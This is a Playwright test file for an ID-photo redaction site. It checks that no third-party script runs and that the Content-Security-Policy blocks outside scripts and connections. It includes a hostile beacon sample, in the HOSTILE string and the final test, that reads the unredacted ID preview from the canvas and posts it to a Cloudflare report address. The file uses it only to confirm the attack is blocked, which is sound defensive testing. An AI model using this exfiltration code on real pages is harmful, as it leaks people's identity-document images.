// SPDX-License-Identifier: AGPL-3.0-or-later
// No third-party script in the page that holds the photos (ADR 0023). A review on 2026-11-26 showed
// that Cloudflare's analytics beacon (ADR 0015), or a substitute served at its address, could read
// the unredacted preview and send it to Cloudflare's report address. These tests serve the build as
// the public site, so any host check in the code runs as it would there, load a card, and fail if any
// script from another origin runs, or if page code can still send the photo out.
import { expect, test, type BrowserContext, type Page } from '@playwright/test'
import { controlled, toEditor } from './helpers.ts'

test.use({ locale: 'es-ES', baseURL: 'https://dnitapado.es/' })

const LOCAL = 'http://localhost:4173/'
/** The public host names the site runs on: one at the root, one under a subpath. */
const ROOT = 'https://dnitapado.es/'
const SITES = [ROOT, 'https://aasanchez.github.io/dnilimpio.es/']
/** The addresses the old beacon used (ADR 0015). Served here so a request to them would succeed. */
const CLOUDFLARE = ['https://static.cloudflareinsights.com/beacon.min.js', 'https://cloudflareinsights.com/cdn-cgi/rum']

/** Stands in for a hostile beacon: it reads the preview and tries every way out. */
const HOSTILE = `
const png = document.querySelector('#preview')?.toDataURL('image/png') ?? 'no-preview'
navigator.sendBeacon('https://cloudflareinsights.com/cdn-cgi/rum', png)
fetch('https://cloudflareinsights.com/cdn-cgi/rum', { method: 'POST', body: png, mode: 'no-cors' }).catch(() => {})
`

interface Traffic { foreign: string[]; reached: string[] }

/**
 * Serves the local build at each public address. Every other request is recorded as foreign; requests
 * to Cloudflare are answered (with the hostile script), so only the browser's own rules can stop them.
 */
async function asPublicSite (context: BrowserContext): Promise<Traffic> {
  const traffic: Traffic = { foreign: [], reached: [] }
  await context.route('**/*', async (route) => {
    const req = route.request()
    const url = req.url()
    const site = SITES.find((s) => url.startsWith(s))
    if (site !== undefined) {
      const res = await fetch(LOCAL + url.slice(site.length))
      const headers = Object.fromEntries([...res.headers].filter(([k]) => !['content-encoding', 'content-length'].includes(k)))
      await route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) })
      return
    }
    if (/^(blob|data):/.test(url)) { await route.continue(); return }
    traffic.foreign.push(`${req.method()} ${url}`)
    if (CLOUDFLARE.some((c) => url.startsWith(c))) {
      traffic.reached.push(`${req.method()} ${url} ${String((req.postData() ?? '').length)} bytes`)
      await route.fulfill({ contentType: 'text/javascript', headers: { 'access-control-allow-origin': '*' }, body: HOSTILE })
      return
    }
    await route.abort('blockedbyclient')
  })
  return traffic
}

/** Records the address of every script element that is ever added to the page, from the first byte. */
async function watchScripts (page: Page): Promise<void> {
  await page.addInitScript(() => {
    const seen: string[] = []
    Object.defineProperty(window, '__scripts', { value: seen })
    new MutationObserver((records) => {
      for (const r of records) {
        for (const n of r.addedNodes) if (n instanceof HTMLScriptElement) seen.push(n.src === '' ? `inline:${n.type}` : n.src)
      }
    }).observe(document, { childList: true, subtree: true })
  })
}

/** Every script the page ever had, every script and module it ran, and every resource it fetched. */
async function scriptsAndResources (page: Page): Promise<{ added: string[]; present: string[]; resources: string[] }> {
  return await page.evaluate(() => ({
    added: (window as unknown as { __scripts: string[] }).__scripts,
    present: [...document.scripts].map((s) => (s.src === '' ? `inline:${s.type}` : s.src)),
    resources: performance.getEntriesByType('resource').map((e) => e.name),
  }))
}

/** Scripts that do not come from this site: anything other than its own origin or the import map. */
function thirdParty (urls: string[], origin: string): string[] {
  return urls.filter((u) => u !== 'inline:importmap' && !/^(blob|data):/.test(u) && new URL(u).origin !== origin)
}

for (const site of SITES) {
  test(`at ${site}, with a card loaded, no third-party script runs and nothing leaves`, async ({ page, context }) => {
    const traffic = await asPublicSite(context)
    await watchScripts(page)
    await page.goto(site)
    await expect(page.locator('h1')).toBeVisible()
    await page.locator('#start').click()
    await page.locator('#file-front').setInputFiles('tests/fixtures/synthetic-front.png')
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    await page.waitForTimeout(6000) // past the idle callback that loaded the beacon before ADR 0023
    const origin = new URL(site).origin
    const s = await scriptsAndResources(page)
    expect(s.present.length).toBeGreaterThan(0)
    expect(thirdParty(s.added, origin)).toEqual([])
    expect(thirdParty(s.present, origin)).toEqual([])
    expect(thirdParty(s.resources, origin)).toEqual([])
    expect(traffic.foreign).toEqual([])
  })
}

test('under the service worker, the editor with both sides runs no third-party script', async ({ browser }) => {
  test.setTimeout(120_000)
  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES', baseURL: ROOT })
  const page = await context.newPage()
  const traffic = await asPublicSite(context)
  await watchScripts(page)
  await controlled(page)
  await toEditor(page)
  await page.waitForTimeout(6000)
  const s = await scriptsAndResources(page)
  expect(thirdParty(s.added, 'https://dnitapado.es')).toEqual([])
  expect(thirdParty(s.present, 'https://dnitapado.es')).toEqual([])
  expect(traffic.foreign).toEqual([])
  await context.close()
})

test('the CSP allows no script and no connection to another origin', async ({ page, context }) => {
  await asPublicSite(context)
  await page.goto(ROOT)
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') ?? ''
  const directive = (name: string): string[] => csp.split(';').map((d) => d.trim().split(/\s+/)).find((d) => d[0] === name)?.slice(1) ?? []
  // Only this site's files, WebAssembly compilation and the import map's hash.
  expect(directive('script-src').filter((v) => !/^'sha256-[A-Za-z0-9+/=]+'$/.test(v))).toEqual(["'self'", "'wasm-unsafe-eval'"])
  expect(directive('connect-src')).toEqual(["'none'"])
  expect(directive('default-src')).toEqual(["'none'"])
})

test('the audit attack fails: a substitute beacon cannot be loaded or send the preview', async ({ page, context }) => {
  test.setTimeout(120_000)
  const traffic = await asPublicSite(context)
  await toEditor(page)
  await expect(page.locator('#preview')).toHaveJSProperty('width', 1712)
  const result = await page.evaluate(async (src) => {
    // 1. Adding the old beacon by its address: Trusted Types refuses the URL, and the CSP would too.
    let added = 'loaded'
    try {
      const s = document.createElement('script')
      s.src = src
      await new Promise<void>((resolve, reject) => { s.onload = () => { resolve() }; s.onerror = () => { reject(new Error('blocked')) }; document.head.append(s) })
    } catch (e) {
      added = e instanceof Error ? e.name : 'blocked'
    }
    // 2. Code already in the page (as the beacon was) reads the preview and tries to send it.
    const png = (document.querySelector('#preview') as HTMLCanvasElement).toDataURL('image/png')
    // eslint-disable-next-line no-restricted-properties -- this test checks that the CSP blocks it
    const beacon = navigator.sendBeacon('https://cloudflareinsights.com/cdn-cgi/rum', png)
    let fetched = 'sent'
    try {
      await fetch('https://cloudflareinsights.com/cdn-cgi/rum', { method: 'POST', body: png, mode: 'no-cors' })
    } catch {
      fetched = 'blocked'
    }
    return { added, beacon: String(beacon), fetched, bytes: png.length }
  }, CLOUDFLARE[0] ?? '')
  expect(result.bytes).toBeGreaterThan(16_000) // the preview is there to steal
  expect(result.added).not.toBe('loaded')
  expect(result.fetched).toBe('blocked')
  // sendBeacon() may answer true and be stopped later: only `reached` tells.
  await page.waitForTimeout(2000)
  expect(traffic.reached).toEqual([])
  expect(traffic.foreign).toEqual([])
})
